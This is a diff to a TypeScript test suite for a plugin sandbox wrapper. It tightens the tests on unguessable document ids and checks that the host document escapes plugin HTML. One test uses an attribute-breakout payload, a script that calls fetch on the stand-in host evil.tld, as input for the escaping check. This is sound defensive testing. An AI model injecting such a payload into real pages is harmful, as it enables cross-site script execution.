@@ -312,7 +312,7 @@ describe("wrapPluginHtml", () => {
     // string matches the guest's own copy of whatever you are looking for: an
     // earlier version of these tests passed with the host `<meta>` deleted.
     function hostOnly(html: string): string {
-      const host = wrapPluginHostDocument(html);
+      const host = wrapPluginHostDocument(html, createPluginDocumentId());
       const start = host.indexOf('srcdoc="');
       const end = host.indexOf('"', start + 'srcdoc="'.length);
       return host.slice(0, start) + host.slice(end);
@@ -346,45 +346,55 @@ describe("wrapPluginHtml", () => {
       expect(wrapPluginHostDocument("<p>hi</p>", Number.NaN)).toContain("var DOCUMENT_ID = 0;");
     });
 
-    // On Android the guest can reach `window.ReactNativeWebView` itself and post
-    // without going through the relay that stamps messages, so the stamp is the
-    // whole of what separates a relayed message from a fabricated one. A
-    // counter hands that to the guest for free.
-    it("mints document ids the plugin cannot guess", () => {
-      const ids = new Set<number>();
+    /**
+     * On both native platforms the guest can post to the host directly, past the
+     * relay that stamps messages, so the stamp is the whole of what separates a
+     * relayed message from a fabricated one.
+     *
+     * The width assertion is the point, and it is why this is not just
+     * "distinct, and bigger than a counter": a 24-bit id would satisfy that and
+     * still be walkable, and the guest has an oracle — a wrong stamp is silent,
+     * a right one draws an `init`. Over 200 draws the max lands above 2^50 with
+     * probability 1 - (1 - 1/4)^200, which is 1 in 10^25 of flaking, and any
+     * narrowing of the range reds it immediately.
+     */
+    function drawIds(): number[] {
+      const ids: number[] = [];
       for (let i = 0; i < 200; i++) {
         const id = createPluginDocumentId();
         // Safe and integral, because it is interpolated into the relay's script
         // as a bare literal and compared after a JSON round trip.
         expect(Number.isSafeInteger(id)).toBe(true);
-        expect(id).toBeGreaterThan(0x100000);
-        ids.add(id);
+        ids.push(id);
       }
+      return ids;
+    }
 
-      expect(ids.size).toBe(200);
+    it("mints document ids the plugin cannot guess", () => {
+      const ids = drawIds();
+
+      expect(new Set(ids).size).toBe(ids.length);
+      expect(Math.max(...ids)).toBeGreaterThan(2 ** 50);
     });
 
-    // The fallback is the branch that runs on a Hermes build without the
-    // `crypto` global — the one platform this stamp exists to defend.
-    it("still mints unguessable ids without a crypto global", () => {
+    // Not the branch that runs on any platform this ships to — `index.ts`
+    // installs an expo-crypto-backed `getRandomValues` before anything else, so
+    // native takes the CSPRNG path. This pins the floor for a runtime that has
+    // neither, which would otherwise fail open to `undefined` arithmetic.
+    it("still mints wide, distinct ids without a crypto global", () => {
       const { crypto } = globalThis;
       Reflect.deleteProperty(globalThis, "crypto");
       try {
-        const ids = new Set<number>();
-        for (let i = 0; i < 200; i++) {
-          const id = createPluginDocumentId();
-          expect(Number.isSafeInteger(id)).toBe(true);
-          expect(id).toBeGreaterThan(0x100000);
-          ids.add(id);
-        }
-        expect(ids.size).toBe(200);
+        const ids = drawIds();
+        expect(new Set(ids).size).toBe(ids.length);
+        expect(Math.max(...ids)).toBeGreaterThan(2 ** 50);
       } finally {
         Object.defineProperty(globalThis, "crypto", { value: crypto, configurable: true });
       }
     });
 
     it("escapes the plugin so it cannot break out of the srcdoc attribute", () => {
-      const host = wrapPluginHostDocument('"><script>fetch("https://evil.tld")</script>');
+      const host = wrapPluginHostDocument('"><script>fetch("https://evil.tld")</script>', 1);
       // Nothing the plugin wrote may appear as markup in the host document: one
       // unescaped quote closes `srcdoc` and the rest runs in the host realm,
       // which is the realm with the bridge in it.
@@ -410,7 +420,7 @@ describe("wrapPluginHtml", () => {
     });
 
     it("still puts the CSP and the neutering script in front of the plugin", () => {
-      const host = wrapPluginHostDocument("<p>hi</p>");
+      const host = wrapPluginHostDocument("<p>hi</p>", 1);
       expect(host).toContain(
         `&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;${PLUGIN_CONTENT_SECURITY_POLICY}&quot;&gt;`,
       );
